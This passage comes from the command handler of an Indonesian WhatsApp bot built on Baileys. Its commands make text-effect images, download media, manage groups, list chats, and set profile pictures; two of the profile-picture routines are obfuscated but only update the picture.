haikal.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => m.reply('*Failed to download File*'))
}
break
//=================================================//
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass':
case 'papercut': 
case 'watercolor':
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
 case 'snow': 
 case 'cloud': 
 case 'honey': 
 case 'ice': 
 case 'fruitjuice': 
 case 'biscuit': 
 case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
 case 'firework': 
 case 'skeleton': 
 case 'blackpink': 
 case 'sand': 
 case 'glue': 
 case '1917': 
 case 'leaves': {
  if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
sticWait(from)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
haikal.sendMessage(m.chat, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
case 'transformer': case 'fomer': case 'trans':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));

sticSukses(from)
break
//=================================================//
case 'herryp': case 'potter': case 'heryy':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case '3dstone': case 'stone':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'thunder': case 'thun':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'graf':
case 'graffiti':
case 'grafiti':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'glitch3':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
 `${teks1}`,`${teks2}`])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case '3dbox':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'drapwater': case 'water':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'lion2': case 'lionn':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${q}`,])
.then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'papercut': case 'paper': case 'cute':
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
 .then((data) => haikal.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 sticSukses(from)
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
let { ytv } = require('./baseikal/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
haikal.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================//
case 'q': case 'quoted': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await haikal.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await haikal.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 haikal.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
  if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
  let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
haikal.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'delete': case 'del': {
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
haikal.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'linkgroup': case 'linkgc': {
if (!isPrem) return replyprem(mess.premium)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await haikal.groupInviteCode(m.chat)
haikal.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'tagall': {
if (!m.isGroup) throw groupon(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!m.isGroup) throw groupon(from)
haikal.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
case 'style': case 'styletext': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./baseikal/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
m.reply(teks)
}
break

//=================================================//
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
haikalgans = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await haikal.sendMessage(m.chat, { audio: haikalgans, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

       case 'group': case 'grup': {       
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
if (args[0] === 'close'){
    await haikal.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
    await haikal.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
let buttons = [
{ buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await haikal.sendButtonText(m.chat, buttons, `Mode Group`, haikal.user.name, m)

     }
    }
    break
    case 'editinfo': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
     if (args[0] === 'open'){
await haikal.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else if (args[0] === 'close'){
await haikal.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
     } else {
     let buttons = [
{ buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
{ buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
    ]
    await haikal.sendButtonText(m.chat, buttons, `Mode Edit Info`, haikal.user.name, m)

    }
    }
    break
    case 'join': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!text) throw 'Masukkan Link Group!'
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
m.reply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await haikal.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
    }
    break
case 'setppbot': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await haikal[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./baseikal/lib/myfunc');var {img}=await generateProfilePicture(media);await haikal[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await haikal[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await haikal['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./baseikal/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await haikal[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await haikal['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
case 'block': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await haikal.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await haikal.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'once': case 'toonce': { 
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await haikal.downloadAndSaveMediaMessage(quoted)
haikal.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break

case 'ss': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!text) throw `Example : ${prefix + command} Url`
anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
buf = await getBuffer(anu.screenshot) 
haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted:m }).catch((err) => m.reply(jsonformat('*LINK NYA SLUR*')))
}
break
//=================================================//
case 'searchgroups':
if (!isPrem) return replyprem(mess.premium)
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
if (!q) return m.reply(`Example: ${prefix}searchgroups hacker`)
mel.linkwa(q)
.then(result => {
let res = '❰ *WHATSAPP GROUP LINKS* ❱\n\n'
for (let i of result) {
res += `*NAME*: *${i.nama}\n*Link*: ${i.link}\n\n`
}
m.reply(res)
});
break
//=================================================//
case 'kick': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
